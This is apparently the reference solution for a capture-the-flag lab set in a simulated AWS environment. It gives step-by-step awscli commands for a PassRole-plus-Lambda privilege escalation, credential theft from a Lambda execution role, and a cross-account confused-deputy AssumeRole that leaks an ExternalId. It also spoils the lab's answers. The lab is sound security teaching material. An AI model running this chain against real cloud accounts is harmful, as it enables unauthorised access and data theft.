# Deputy — Reference Solution (spoiler)

A self-contained simulated AWS (IAM/STS/Lambda/S3) driven by real `awscli --endpoint-url`. Two accounts:
`111111111111` (ours: analyst + ci-runner-role) and `999999999999` (DeputyCorp, the partner:
partner-admin-role + partner-secure-role). The chain is a Lambda+PassRole privesc into a partner role
that **over-trusts our whole account with no ExternalId** (the cross-account confused-deputy), then the
partner's correctly-hardened role gated by `sts:ExternalId`.

```sh
EP="--endpoint-url http://<host>:<port>"
export AWS_DEFAULT_REGION=us-east-1
aws configure set default.s3.addressing_style path        # path-style S3 against the endpoint
export AWS_ACCESS_KEY_ID=AKIAANALYST0000000000
export AWS_SECRET_ACCESS_KEY=x                             # any value; signatures aren't verified
```

## Stage 1 — recon → FLAG1
```sh
aws $EP sts get-caller-identity                                   # user/analyst
aws $EP s3api list-buckets --query 'Buckets[].Name'              # discover the buckets
aws $EP iam get-user-policy --user-name analyst --policy-name analyst-permissions   # your own perms
aws $EP s3api get-object --bucket deputy-analyst-scratch --key welcome.txt /dev/stdout   # FLAG1
```
You can `iam:Get*/List*`, `s3:ListAllMyBuckets`, `lambda:CreateFunction/InvokeFunction`, and
`iam:PassRole` **only** on `ci-runner-role`. You can also read `ci-runner-role`'s permissions:
```sh
aws $EP iam get-role-policy --role-name ci-runner-role --policy-name ci-runner-permissions
# -> it may sts:AssumeRole arn:aws:iam::999999999999:role/partner-admin-role  (your eventual target)
```
(The partner account's roles do NOT appear in your `list-roles` — you can't enumerate another account.)

## Stage 2 — PassRole + Lambda → steal ci-runner-role → FLAG2
Pass the more-privileged `ci-runner-role` to a function and invoke it; the function returns its
execution role's credentials:
```sh
aws $EP lambda create-function --function-name pwn --runtime python3.12 \
    --role arn:aws:iam::111111111111:role/ci-runner-role --handler index.handler --zip-file fileb://f.zip
aws $EP lambda invoke --function-name pwn out.json ; cat out.json     # -> AWS_* creds for ci-runner-role
# export those three env vars, then:
aws $EP s3api get-object --bucket deputy-runner-logs --key build.log /dev/stdout        # FLAG2
```
(`f.zip` is any real zip — the code is ignored. You cannot pass `partner-admin-role`: `iam:PassRole`
is scoped to `ci-runner-role`.)

## Stage 3 — the cross-account over-trust → admin → FLAG3
`ci-runner-role` may `sts:AssumeRole` the partner's `partner-admin-role` (account 999), whose trust
policy trusts **our** account root `111111111111` with **no `ExternalId`** — it over-trusts us:
```sh
aws $EP sts assume-role --role-arn arn:aws:iam::999999999999:role/partner-admin-role \
    --role-session-name admin        # -> admin creds; export them
aws $EP s3api get-object --bucket deputy-flag-vault --key flag /dev/stdout              # FLAG3
aws $EP s3api get-object --bucket deputy-flag-vault --key partner-config.json /dev/stdout   # leaks the ExternalId + secure-role arn
```

## Stage 4 — the hardened partner role, done right → FLAG4
`partner-secure-role` (account 999) requires the correct `sts:ExternalId` (assuming it without / with a
wrong id is denied — the near-miss). Use the leaked id:
```sh
aws $EP sts assume-role --role-arn arn:aws:iam::999999999999:role/partner-secure-role \
    --role-session-name crown --external-id Dc-2026-8f31a97c4b2e     # export creds
aws $EP s3api get-object --bucket deputy-crown-vault --key flag /dev/stdout             # FLAG4
```

## Why the gates are real (anti-cheese, all verified with real awscli)
- The partner account's roles are invisible to analyst's IAM (`get-role partner-secure-role` →
  NoSuchEntity), so the stage-4 ExternalId is **not** discoverable at recon — only via the stage-3 loot.
- analyst can't `sts:AssumeRole partner-admin-role` directly (no permission) → must go via the runner.
- analyst can't `iam:PassRole partner-admin-role` into a Lambda (PassRole scoped to `ci-runner-role`).
- analyst can't read `deputy-flag-vault` / `deputy-crown-vault` (no `s3:GetObject`).
- `partner-secure-role` rejects AssumeRole without the exact `sts:ExternalId`.
- Every request is identified (unauthenticated calls are rejected).
